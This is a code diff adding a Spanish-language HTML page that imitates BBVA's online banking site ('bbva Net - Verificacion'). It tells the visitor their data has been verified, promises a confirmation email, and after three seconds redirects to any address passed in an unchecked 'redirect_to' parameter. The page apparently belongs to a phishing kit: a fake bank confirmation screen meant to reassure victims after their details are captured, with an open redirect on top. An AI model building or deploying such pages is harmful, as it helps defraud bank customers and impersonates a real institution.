@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>bbva Net - Verificacion</title>
+    <link rel="icon" href="data:," />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              bbvaBlue: "#0B3A88",
+            },
+          },
+        },
+      };
+    </script>
+    <style>
+      html,
+      body {
+        height: 100%;
+      }
+
+      body {
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      .bbva-hr {
+        height: 2px;
+        background: linear-gradient(
+          90deg,
+          rgba(11, 58, 136, 0.15),
+          rgba(11, 58, 136, 0.55),
+          rgba(11, 58, 136, 0.55),
+          rgba(11, 58, 136, 0.15)
+        );
+      }
+    </style>
+  </head>
+  <body class="min-h-screen bg-white text-bbvaBlue">
+    <!--
+      Loader (overlay full-screen)
+      - Para mostrarlo: agrega la clase `is-open` al div `.bbva-loader`
+      - Para ocultarlo: quita la clase `is-open`
+
+      Nota: en esta pagina el loader usa estilos inline para ser independiente.
+    -->
+    <div
+      class="bbva-loader"
+      role="status"
+      aria-live="polite"
+      aria-label="Cargando"
+      style="
+        position: fixed;
+        inset: 0;
+        z-index: 50;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        background: rgba(255, 255, 255, 0.92);
+      "
+    >
+      <div
+        style="
+          width: min(420px, calc(100vw - 48px));
+          border-radius: 14px;
+          border: 1px solid rgba(11, 58, 136, 0.25);
+          background: #fff;
+          padding: 22px 20px;
+          text-align: center;
+        "
+      >
+        <div style="display: flex; align-items: center; justify-content: center; gap: 10px">
+          <img src="./resources/logo_navbar.png" alt="bbva" style="height: 28px; width: auto" />
+          <div
+            aria-hidden="true"
+            style="
+              height: 30px;
+              width: 30px;
+              border-radius: 999px;
+              border: 3px solid rgba(11, 58, 136, 0.15);
+              border-top-color: rgba(11, 58, 136, 1);
+              animation: spin 0.9s linear infinite;
+            "
+          ></div>
+        </div>
+        <div style="margin-top: 12px; font-size: 14px; font-weight: 700">Cargando...</div>
+        <div style="margin-top: 6px; font-size: 12px; opacity: 0.8">Espera un momento</div>
+      </div>
+    </div>
+
+    <main class="mx-auto w-[960px] max-w-full px-4 pb-24 pt-8">
+      <header class="flex items-start justify-between">
+        <img
+          src="./resources/logo_navbar.png"
+          class="h-[60px] w-auto"
+          alt="bbva"
+          decoding="async"
+          loading="eager"
+        />
+        <div class="pt-6 text-[14px] font-bold">Bienvenido al servicio bbva Net</div>
+      </header>
+
+      <div class="bbva-hr mx-auto mt-7 w-[560px] max-w-full"></div>
+
+      <section class="mx-auto mt-10 max-w-[720px] text-center">
+        <p class="text-[18px] font-bold leading-[22px]">
+          Tus datos han sido verificados exitosamente, en las próximas 24 horas llegará un correo notificando esta autorización <br> Redirigiendo...
+        </p>
+      </section>
+    </main>
+    <style>
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      .bbva-loader.is-open {
+        display: flex !important;
+      }
+    </style>
+    <script>
+      window.addEventListener("DOMContentLoaded", () => {
+        const params = new URLSearchParams(window.location.search);
+        const redirectTo = params.get("redirect_to");
+
+        setTimeout(() => {
+          if (redirectTo) {
+            window.location.href = redirectTo;
+            return;
+          }
+          window.location.href = "/";
+        }, 3000);
+      });
+    </script>
+  </body>
+</html>
